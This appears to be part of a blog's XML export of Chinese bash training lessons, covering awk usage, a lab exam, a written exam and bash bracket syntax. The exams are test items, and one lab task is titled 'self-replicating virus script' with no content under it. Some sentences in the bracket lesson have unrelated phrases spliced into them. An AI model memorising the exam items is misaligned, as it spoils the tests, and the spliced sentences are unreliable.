+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@www ~]# last -n 5 &lt;==仅取出前五行</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 11:21   still logged in</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 00:46 - 02:28  (01:41)</span><br><span class="line">root     pts/1   192.168.1.100  Mon Feb  9 11:41 - 18:30  (06:48)</span><br><span class="line">dmtsai   pts/1   192.168.1.100  Mon Feb  9 11:41 - 11:41  (00:00)</span><br><span class="line">root     tty1                   Fri Sep  5 14:09 - 14:10  (00:01)</span><br></pre></td></tr></table></figure>
+<p>如果只是显示最近登录的5个帐号</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">last -n 5 | awk  <span class="string">'&#123;print $1&#125;'</span></span></span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">dmtsai</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>awk工作流程是这样的：读入有’\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键”,所以$1表示登录用户，$3表示登录用户ip,以此类推。</p>
+<p>如果只是显示/etc/passwd的账户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1&#125;'</span>  </span></span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br></pre></td></tr></table></figure>
+<p>这种是awk+action的示例，每行都会执行action{print $1}。</p>
+<p>-F指定域分隔符为’:’。</p>
+<p>如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以tab键分割</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1"\t"$7&#125;'</span></span></span><br><span class="line">root    /bin/bash</span><br><span class="line">daemon  /bin/sh</span><br><span class="line">bin     /bin/sh</span><br><span class="line">sys     /bin/sh</span><br></pre></td></tr></table></figure>
+
+
+<p>如果只是显示/etc/passwd的账户和账户对应的shell,而账户与shell之间以逗号分割,而且在所有行添加列名name,shell,在最后一行添加”blue,/bin/nosh”。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |awk  -F ':'  'BEGIN &#123;print "name,shell"&#125;  &#123;print $1","$7&#125; END &#123;print "blue,/bin/nosh"&#125;'</span><br><span class="line">name,shell</span><br><span class="line">root,/bin/bash</span><br><span class="line">daemon,/bin/sh</span><br><span class="line">bin,/bin/sh</span><br><span class="line">sys,/bin/sh</span><br><span class="line">....</span><br><span class="line">blue,/bin/nosh</span><br></pre></td></tr></table></figure>
+
+
+<p>awk工作流程是这样的：先执行BEGING，然后读取文件，读入有/n换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域,随后开始执行模式所对应的动作action。接着开始读入第二条记录······直到所有的记录都读完，最后执行END操作。</p>
+<p>搜索/etc/passwd有root关键字的所有行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk -F: <span class="string">'/root/'</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>这种是pattern的使用示例，匹配了pattern(这里是root)的行才会执行action(没有指定action，默认输出每行的内容)。</p>
+<p>搜索支持正则，例如找root开头的: awk -F: ‘/^root/‘ /etc/passwd</p>
+<p>搜索/etc/passwd有root关键字的所有行，并显示对应的shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> awk -F: <span class="string">'/root/&#123;print $7&#125;'</span> /etc/passwd             </span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>这里指定了action{print $7}</p>
+<h3 id="awk内置变量"><a href="#awk内置变量" class="headerlink" title="awk内置变量"></a>awk内置变量</h3><p>awk有许多内置变量用来设置环境信息，这些变量可以被改变，下面给出了最常用的一些变量。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ARGC               命令行参数个数</span><br><span class="line">ARGV               命令行参数排列</span><br><span class="line">ENVIRON            支持队列中系统环境变量的使用</span><br><span class="line">FILENAME           awk浏览的文件名</span><br><span class="line">FNR                浏览文件的记录数</span><br><span class="line">FS                 设置输入域分隔符，等价于命令行 -F选项</span><br><span class="line">NF                 浏览记录的域的个数</span><br><span class="line">NR                 已读的记录数</span><br><span class="line">OFS                输出域分隔符</span><br><span class="line">ORS                输出记录分隔符</span><br><span class="line">RS                 控制记录分隔符</span><br></pre></td></tr></table></figure>
+
+
+
+<p>此外,$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,……以此类推。</p>
+<p>统计/etc/passwd:文件名，每行的行号，每行的列数，对应的完整行内容:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk  -F <span class="string">':'</span>  <span class="string">'&#123;print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0&#125;'</span> /etc/passwd</span></span><br><span class="line">filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/bash</span><br><span class="line">filename:/etc/passwd,linenumber:2,columns:7,linecontent:daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:3,columns:7,linecontent:bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:4,columns:7,linecontent:sys:x:3:3:sys:/dev:/bin/sh</span><br></pre></td></tr></table></figure>
+
+
+<p>使用printf替代print,可以让代码更加简洁，易读</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk  -F ':'  '&#123;printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)&#125;' /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="print和printf"><a href="#print和printf" class="headerlink" title="print和printf"></a>print和printf</h3><p>awk中同时提供了print和printf两种打印输出的函数。</p>
+<p>其中print函数的参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。</p>
+<p>printf函数，其用法和c语言中printf基本相似,可以格式化字符串,输出复杂时，printf更加好用，代码更易懂。</p>
+<h3 id="awk编程"><a href="#awk编程" class="headerlink" title="awk编程"></a>awk编程</h3><h4 id="变量和赋值"><a href="#变量和赋值" class="headerlink" title="变量和赋值"></a>变量和赋值</h4><p>除了awk的内置变量，awk还可以自定义变量。</p>
+<p>下面统计/etc/passwd的账户人数</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk '&#123;count++;print $0;&#125; END&#123;print "user count is ", count&#125;' /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">......</span><br><span class="line">user count is  40</span><br></pre></td></tr></table></figure>
+<p>count是自定义变量。之前的action{}里都是只有一个print,其实print只是一个语句，而action{}可以有多个语句，以;号隔开。</p>
+<p>这里没有初始化count，虽然默认是0，但是妥当的做法还是初始化为0:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk 'BEGIN &#123;count=0;print "[start]user count is ", count&#125; &#123;count=count+1;print $0;&#125; END&#123;print "[end]user count is ", count&#125;' /etc/passwd</span><br><span class="line">[start]user count is  0</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">[end]user count is  40</span><br></pre></td></tr></table></figure>
+
+<p>统计某个文件夹下的文件占用的字节数</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size&#125;'</span><br><span class="line">[end]size is  8657198</span><br></pre></td></tr></table></figure>
+
+
+<p>如果以M为单位显示:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.25889 M</span><br></pre></td></tr></table></figure>
+
+<p>注意，统计不包括文件夹的子目录。</p>
+<h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>awk中的条件语句是从C语言中借鉴来的，见如下声明方式：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">    statement;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; else if (expression1) &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>统计某个文件夹下的文件占用的字节数,过滤4096大小的文件(一般都是文件夹):</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;print "[start]size is ", size&#125; &#123;if($5!=4096)&#123;size=size+$5;&#125;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.22339 M</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><p>awk中的循环语句同样借鉴于C语言，支持while、do/while、for、break、continue，这些关键字的语义和C语言中的语义完全相同。</p>
+<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>因为awk中数组的下标可以是数字和字母，数组的下标通常被称为关键字(key)。值和关键字都存储在内部的一张针对key/value应用hash的表格里。由于hash不是顺序存储，因此在显示数组内容时会发现，它们并不是按照你预料的顺序显示出来的。数组和变量一样，都是在使用时自动创建的，awk也同样会自动判断其存储的是数字还是字符串。一般而言，awk中的数组用来从记录中收集信息，可以用于计算总和、统计单词以及跟踪模板被匹配的次数等等。</p>
+<p>显示/etc/passwd的账户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk -F ':' 'BEGIN &#123;count=0;&#125; &#123;name[count] = $1;count++;&#125;; END&#123;for (i = 0; i &lt; NR; i++) print i, name[i]&#125;' /etc/passwd</span><br><span class="line">0 root</span><br><span class="line">1 daemon</span><br><span class="line">2 bin</span><br><span class="line">3 sys</span><br><span class="line">4 sync</span><br><span class="line">5 games</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>这里使用for循环遍历数组</p>
+<p>awk编程的内容极多，这里只罗列简单常用的用法，更多请参考 <a href="http://www.gnu.org/software/gawk/manual/gawk.html" target="_blank" rel="noopener">http://www.gnu.org/software/gawk/manual/gawk.html</a></p>
+]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX Shell Scripts 第六课 上机考试</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/</url>
+    <content><![CDATA[<blockquote>
+<p>请将脚本保存，存放路径为/home/kiosk/Desktop/stux/,其中x为你的机号<br>test.sh num.sh checkip.sh dns.sh useradd.sh 每题20分</p>
+</blockquote>
+<h2 id="1-流程控制语句应用测试："><a href="#1-流程控制语句应用测试：" class="headerlink" title="1.流程控制语句应用测试："></a>1.流程控制语句应用测试：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个脚本，脚本名为test.sh</span><br><span class="line">判断&#x2F;tmp&#x2F;test1至&#x2F;tmp&#x2F;test50和&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;hosts文件存在不存在，若不存在则将该文件创建出来。</span><br></pre></td></tr></table></figure>
+<h2 id="2-按照运行结果编写Shell脚本："><a href="#2-按照运行结果编写Shell脚本：" class="headerlink" title="2.按照运行结果编写Shell脚本："></a>2.按照运行结果编写Shell脚本：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">要求：1）脚本名为num.sh</span><br><span class="line">      2）要求显示结果如下：</span><br><span class="line"> 第一行0，第二行01，第三行012，以此类推，输出如上0到9的结果即可。</span><br><span class="line">0</span><br><span class="line">01</span><br><span class="line">012</span><br><span class="line">0123</span><br><span class="line">01234</span><br><span class="line">012345</span><br><span class="line">0123456</span><br><span class="line">01234567</span><br><span class="line">012345678</span><br><span class="line">0123456789</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-正则表达式应用测试："><a href="#3-正则表达式应用测试：" class="headerlink" title="3.正则表达式应用测试："></a>3.正则表达式应用测试：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个IP检测脚本</span><br><span class="line">1） 脚本名为checkip.sh</span><br><span class="line">2） 输入参数为$1，$1 为要判断的输入，如果$1 为ip 地址，则输出”This is ip address”,</span><br><span class="line">如果$1 为非ip 地址，则输出”This is not ip address”</span><br><span class="line">3） 执行方法为checkip.sh 192.168.1.1</span><br><span class="line">4） 测试如下输入值</span><br><span class="line">192.168.0.199  192.a.12.0  24.235.299.1  192.168.3</span><br></pre></td></tr></table></figure>
+<h3 id="4-实际应用测试1"><a href="#4-实际应用测试1" class="headerlink" title="4.实际应用测试1"></a>4.实际应用测试1</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个脚本，脚本名为dns.sh,通过脚本搭建dns。</span><br><span class="line">要求：	解析uplooking.com域名</span><br><span class="line">	A记录有www.uplooking.com 10.2.2.2</span><br><span class="line">	PTR记录有相应的反向解析</span><br></pre></td></tr></table></figure>
+<h3 id="5-实际应用测试2"><a href="#5-实际应用测试2" class="headerlink" title="5.实际应用测试2"></a>5.实际应用测试2</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编写一个脚本，脚本名为useradd.sh</span><br><span class="line">要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。</span><br><span class="line">	[root@rhel6 ~]# cat &#x2F;tmp&#x2F;useraddlist1</span><br><span class="line">	dabao 888 xuexi,it uplooking</span><br><span class="line">	lucy 889 sales,it uplooking</span><br><span class="line">	lily 899 pro,aa uplooking</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-病毒自我复制脚本"><a href="#6-病毒自我复制脚本" class="headerlink" title="6.病毒自我复制脚本"></a>6.病毒自我复制脚本</h3><h3 id="7-获取apache访问日志中访问次数最多的前5个ip地址"><a href="#7-获取apache访问日志中访问次数最多的前5个ip地址" class="headerlink" title="7.获取apache访问日志中访问次数最多的前5个ip地址"></a>7.获取apache访问日志中访问次数最多的前5个ip地址</h3>]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX Shell Scripts 第七课 笔试</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/</url>
+    <content><![CDATA[<h2 id="一：纠错题：请找出以下代码有错误的地方并更正。（3-20）"><a href="#一：纠错题：请找出以下代码有错误的地方并更正。（3-20）" class="headerlink" title="一：纠错题：请找出以下代码有错误的地方并更正。（3*20）"></a>一：纠错题：请找出以下代码有错误的地方并更正。（3*20）</h2><h3 id="1-两个数字相加"><a href="#1-两个数字相加" class="headerlink" title="1. 两个数字相加"></a>1. 两个数字相加</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin.bash</span></span><br><span class="line">read -p "input number1" : num1</span><br><span class="line">read -p "input number2" : num2</span><br><span class="line">echo $(num1+num2)</span><br></pre></td></tr></table></figure>
+<p>请将更正脚本保存，名为1.sh，存放路径为/home/kiosk/Desktop/stux/1.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p>
+<h3 id="2-将开机selinux状态设置为disabled"><a href="#2-将开机selinux状态设置为disabled" class="headerlink" title="2. 将开机selinux状态设置为disabled"></a>2. 将开机selinux状态设置为disabled</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">sed 'SELINUXs/disabled/enforcing/' /etc/selinux/config</span><br></pre></td></tr></table></figure>
+<p>请将更正脚本保存，名为2.sh，存放路径为/home/kiosk/Desktop/stux/2.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p>
+<h3 id="3-判断100以内被5整除但是不能被7整除的数字"><a href="#3-判断100以内被5整除但是不能被7整除的数字" class="headerlink" title="3. 判断100以内被5整除但是不能被7整除的数字"></a>3. 判断100以内被5整除但是不能被7整除的数字</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in (seq 1 100)</span><br><span class="line">A=$(($i % 5))</span><br><span class="line">B=$(($i%7))</span><br><span class="line">if [ $A -eq 0 ] -a [ $B -ne 0 ]</span><br><span class="line">then</span><br><span class="line">echo $i</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>请将更正脚本保存，名为3.sh，存放路径为/home/kiosk/Desktop/stux/3.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p>
+<h2 id="二：填空题（2-10）"><a href="#二：填空题（2-10）" class="headerlink" title="二：填空题（2*10）"></a>二：填空题（2*10）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 通过什么符号计算传递进来的位置参数？__________</span><br><span class="line">2. 如何检查之前的命令是否运行成功？__________</span><br><span class="line">3. 如何获取一个文件每一行以空格为分隔的第三个元素？__________</span><br><span class="line">4. 调试bash脚本的参数为？__________</span><br><span class="line">5.    A&#x3D;a:b:c:d    echo $&#123;A&#x2F;&#x2F;:&#x2F;&#125;	     结果是__________</span><br><span class="line">6. awk的NR变量作用是什么？___________________</span><br><span class="line">7. 如何获取数组的长度?   ____________</span><br><span class="line">8. 如何引用传递给脚本的第十个位置参数？_______________</span><br><span class="line">9. $$的含义？_____________________</span><br><span class="line">10. 命令 “export” 有什么用？ ____________________________</span><br></pre></td></tr></table></figure>
+
+<h2 id="三：选择题（2-10）"><a href="#三：选择题（2-10）" class="headerlink" title="三：选择题（2*10）"></a>三：选择题（2*10）</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Awk里的内置变量NF指的是（    ）</span><br><span class="line">A）  所有输入文件记录的行数         B） 单个输入文件记录的行数</span><br><span class="line">C） 以指定分隔符号作为分隔的列数   D） AWK处理文件的个数</span><br><span class="line"></span><br><span class="line">2. 跳出当前循环，进入下一个循环使用的语句是（   ）</span><br><span class="line">A） continue		B）break     C）exit    D）return</span><br><span class="line"></span><br><span class="line">3. 使用正则表达式的语句sed -n &#39;&#x2F;^\&lt;[^0-9a-d]*\&gt;$&#x2F;p&#39; &#x2F;tmp&#x2F;list输出的可能是以下哪个（   ）</span><br><span class="line">A）kevin alice     B）selena</span><br><span class="line">C）peter         D）23naive</span><br><span class="line"></span><br><span class="line">4. 以下哪个选项关于数组赋值是错误的（    ）</span><br><span class="line">A） A[1]&#x3D;3       B）A&#x3D;([15]&#x3D;1 a d e)</span><br><span class="line">C）A&#x3D;((6 7 0 2))   D）A&#x3D;(15 3 47 a)</span><br><span class="line"></span><br><span class="line">5. 以下哪个表达式可以算出8+3的结果（    ）</span><br><span class="line">A） echo $((8+3))</span><br><span class="line">B） echo $(8+3)</span><br><span class="line">C） echo $&#123;8+3&#125;</span><br><span class="line">D） echo $[[8+3]]</span><br><span class="line"></span><br><span class="line">6. 以下哪个流程语句是判断为真则做循环（    ）</span><br><span class="line">A） until   B）while</span><br><span class="line">C）case   D）for</span><br><span class="line">7. 阅读以下代码，该代码输出结果是（    ）</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">i&#x3D;0</span><br><span class="line">sum&#x3D;0</span><br><span class="line">while [ $i -le 5 ]</span><br><span class="line">do</span><br><span class="line">        sum&#x3D;$(($sum+$i))</span><br><span class="line">        i&#x3D;$(($i+1))</span><br><span class="line">done</span><br><span class="line">        echo $sum</span><br><span class="line">A）10    B）21    C）15     D）该代码执行会产生死循环</span><br><span class="line"></span><br><span class="line">8. 函数内如何设置局部变量（    ）</span><br><span class="line">A） local    B）export</span><br><span class="line">C）source  D）function</span><br><span class="line"></span><br><span class="line">9. 以下哪一种指令显示的结果为$test（   ）</span><br><span class="line">A）\echo $test      B）echo &quot;$test&quot;</span><br><span class="line">C）echo &#39;$test&#39;      D）echo &quot;$&#123;test&#125;&quot;</span><br><span class="line"></span><br><span class="line">10. shift的作用是（    ）</span><br><span class="line">A） 定义返回值     B）移动位置参数</span><br><span class="line">C）跳出脚本    	D）跳出循环</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX Shell Scripts 第五课 各种括号的作用</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/</url>
+    <content><![CDATA[<h3 id="一、小括号-圆括号"><a href="#一、小括号-圆括号" class="headerlink" title="一、小括号,圆括号()"></a>一、小括号,圆括号()</h3><h4 id="1、单小括号"><a href="#1、单小括号" class="headerlink" title="1、单小括号 ()"></a>1、单小括号 ()</h4><p>1 命令组。括号中的命令将会新开一个子shell顺序执行,所以括号中的变量不能够被脚本余下的部分使用。括号中多个命令之间用分号隔开,最后一个命令可以没有分号,各命令和括号之间不必有空格。</p>
+<p>2 命令替换。等同于<code>cmd</code>,shell扫描一遍命令行,发现了$(cmd)结构,便将$(cmd)中的cmd执行一次,得到其标准输出,再将此输出放到原来命令。有些shell不支持,如tcsh。</p>
+<p>3 用于初始化数组。如:array=(a b c d)</p>
+<h4 id="2、双小括号"><a href="#2、双小括号" class="headerlink" title="2、双小括号 (( ))"></a>2、双小括号 (( ))</h4><p>1 整数扩展。这种扩展计算是整数型的计算,不支持浮点型。((exp))结构扩展并计算一个算术表达式的值,如果表达式的结果为0,那么返回的退出状态码为1,或者 是”假”,而一个非零值的表达式所返回的退出状态码将为0,或者是”true”。若是逻辑判断,表达式exp为真则为1,假则为0。</p>
+<p>2 只要括号中的运算符、表达式符合C语言运算规则,都可用在$((exp))中,甚至是三目运算符。作不同进位(如二进制、八进制、十六进制)运算时,输出结果全都自动转化成了十进制。如:echo $((16#5f)) 结果为95(16进位转十进制)</p>
+<p>3 单纯用 (( )) 也可重定义变量值,比如 a=5; ((a++)) 可将 $a 重定义为6</p>
+<p>4 常用于算术运算比较,双括号中的变量可以不使用$符号前缀。括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则,比如可以直接使用for((i=0;i&lt;5;i++)), 如果不使用双括号, 则为for i in <code>seq 04</code>或者for i in {0..4}。再如可以直接使用if (($i&lt;5)), 如果不使用双括号, 则为if [ $i -lt 5 ]。</p>
+<h3 id="二、中括号-方括号"><a href="#二、中括号-方括号" class="headerlink" title="二、中括号,方括号[]"></a>二、中括号,方括号[]</h3><h4 id="1、单中括号"><a href="#1、单中括号" class="headerlink" title="1、单中括号 []"></a>1、单中括号 []</h4><p>1 bash 的内部命令,[和test是等同的。如果我们不用绝对路径指明,通常我们用的都是bash自带的命令。if/test结构中的左中括号是调用test的命令标识,右中括号是关闭条件判断的。这个命令把它的参数作为比较表达式或者作为文件测试,并且根据比较的结果来返回一个退出状态码。if/test结构中并不是必须右中括号,但是新版的Bash中要求必须这样。</p>
+<p>2 Test和[]中可用的比较运算符只有==和!=,两者都是用于字符串比较的,不可用于整数比较,整数比较只能使用-eq,-gt这种形式。无论是字符串比较还是整数比较都不支持大于号小于号。如果实在想用,对于字符串比较可以使用转义形式,如果比较”ab”和”bc”:[ ab &lt; bc ],结果为真,也就是返回状态为0。[ ]中的逻辑与和逻辑或使用-a 和-o 表示。</p>
+<p>3 字符范围。用作正则表达式的一部分,描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。</p>
+<p>4 在一个array 结构的上下文中,中括号用来引用数组中每个元素的编号。</p>
+<h4 id="2、双中括号"><a href="#2、双中括号" class="headerlink" title="2、双中括号[[ ]]"></a>2、双中括号[[ ]]</h4><p>1 [[是 bash 程序语言的关键字。并不是一个命令,[[ ]] 结构比[ ]结构更加通用。在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割,但是会发生参数扩展和命令替换。</p>
+<p>2 支持字符串的模式匹配,使用=~操作符时甚至支持shell的正则表达式。字符串比较时可以把右边的作为一shell中各种括号的作用()、个模式,而不仅仅是一个字符串,比如[[ hello == hell? ]],结果为真。[[ ]] 中匹配字符串或通配符,不需要引号。</p>
+<p>3 使用[[ … ]]条件判断结构,而不是[ … ],能够防止脚本中的许多逻辑错误。比如,&amp;&amp;、||、&lt;和&gt; 操作符能linux shell下除了某个文件外的其他文件全部删除够正常存在于[[ ]]条件判断结构中,但是如果出现在[ ]结构中的话,会报错。比如可以直接使用if [[ $a != 1 &amp;&amp;$a != 2 ]], 如果不适用双括号, 则为if [ $a -ne 1] &amp;&amp; [ $a != 2 ]或者if [ $a -ne 1 -a $a != 2 ]。</p>
+<p>4 bash把双中括号中的表达式看作一个单独的元素,并返回一个退出状态码。</p>
+<h3 id="三、大括号、花括号"><a href="#三、大括号、花括号" class="headerlink" title="三、大括号、花括号 {}"></a>三、大括号、花括号 {}</h3><h4 id="1、常规用法"><a href="#1、常规用法" class="headerlink" title="1、常规用法"></a>1、常规用法</h4><p>1 大括号拓展。(通配(globbing))将对大括号中的文件名做扩展。在大括号中,不允许有空白,除非这个空白被引用或转义。第一种:对大括号中的以逗号分割的文件列表进行拓展。如 touch {a,b}.txt 结果为a.txt b.txt。第二种:对大括号中以点点(..)分割的顺序文件列表起拓展作用,如:touch {a..d}.txt 结果为a.txt b.txt c.txtd.txt</p>
+<p>2 代码块,又被称为内部组,这个结构事实上创建了一个匿名函数 。与小括号中的命令不同,大括号内的命令不会新开一个子shell运行,即脚本余下部分仍可使用括号内变量。括号内的命令间用分号隔开,最后一个也必须有分号。{}的第一个命令和左括号之间必须要有一个空格</p>
+<h4 id="2、几种特殊的替换结构"><a href="#2、几种特殊的替换结构" class="headerlink" title="2、几种特殊的替换结构"></a>2、几种特殊的替换结构</h4><p>${var:-string},${var:+string},${var:=string},${var:?string}</p>
+<p>1 ${var:-string}和${var:=string}:若变量var为空,则用在命令行中用string来替换${var:-string},否则变量var不为空时,则用变量var的值来替换${var:-string};对于${var:=string}的替换规则和${var:-string}是一样的,所不同之处是${var:=string}若var为空时,用string替换${var:=string}的同时,把string赋给变量var:${var:=string}很常用的一种用法是,判断某个变量是否赋值,没有的话则给它赋上一个默认值。</p>
+<p>2 ${var:+string}的替换规则和上面的相反,即只有当var不是空的时候才替换成string,若var为空时则不替换或者说是替换成变量 var的值,即空值。(因为变量var此时为空,所以这两种说法是等价的)</p>
+<p>3 ${var:?string}替换规则为:若变量var不为空,则用变量var的值来替换${var:?string};若变量var为空,则把string输出到标准错误中,并从脚本中退出。我们可利用此特性来检查是否设置了变量的值。</p>
+<p>补充扩展:在上面这五种替换结构中string不一定是常值的,可用另外一个变量的值或是一种命令的输出。</p>
+<h4 id="3、四种模式匹配替换结构"><a href="#3、四种模式匹配替换结构" class="headerlink" title="3、四种模式匹配替换结构"></a>3、四种模式匹配替换结构</h4><p>模式匹配记忆方法:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 是去掉左边(在键盘上<span class="comment">#在$之左边)</span></span></span><br><span class="line"><span class="meta">%</span><span class="bash"> 是去掉右边(在键盘上%在$之右边)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">和%中的单一符号是最小匹配,两个相同符号是最大匹配。</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;var%pattern&#125;,<span class="variable">$&#123;var%%pattern&#125;</span>,<span class="variable">$&#123;var#pattern&#125;</span>,<span class="variable">$&#123;var##pattern&#125;</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="4、字符串提取和替换"><a href="#4、字符串提取和替换" class="headerlink" title="4、字符串提取和替换"></a>4、字符串提取和替换</h4><p>${var:num},${var:num1:num2},${var/pattern/pattern},${var//pattern/pattern}</p>
+<ul>
+<li>第一种模式:${var:num},这种模式时,shell在var中提取第num个字符到末尾的所有字符。若num为正数,从左边0处开始;若num为负数,从右边开始提取字串,但必须使用在冒号后面加空格或一个数字或整个num加上括号,如${var: -2}、${var:1-3}或${var:(-2)}。</li>
+<li>第二种模式:${var:num1:num2},num1是位置,num2是长度。表示从$var字符串的第$num1个位置开始提取长度为$num2的子串。不能为负数。</li>
+<li>第三种模式:${var/pattern/pattern}表示将var字符串的第一个匹配的pattern替换为另一个pattern。 。</li>
+<li>第四种模式:${var//pattern/pattern}表示将var字符串中的所有能匹配的pattern替换为另一个pattern。</li>
+</ul>
